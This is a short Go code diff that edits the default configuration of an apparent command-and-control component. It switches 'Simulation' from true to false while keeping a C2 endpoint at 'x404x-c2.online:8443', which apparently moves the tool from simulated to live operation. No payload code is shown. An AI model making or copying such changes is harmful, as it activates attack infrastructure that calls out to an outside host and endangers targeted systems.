@@ -17,5 +17,5 @@ type V27Config struct {
 }
 
 func DefaultV27Config() *V27Config {
-	return &V27Config{Enabled: true, Simulation: true, C2Endpoint: "x404x-c2.online:8443"}
+	return &V27Config{Enabled: true, Simulation: false, C2Endpoint: "x404x-c2.online:8443"}
 }
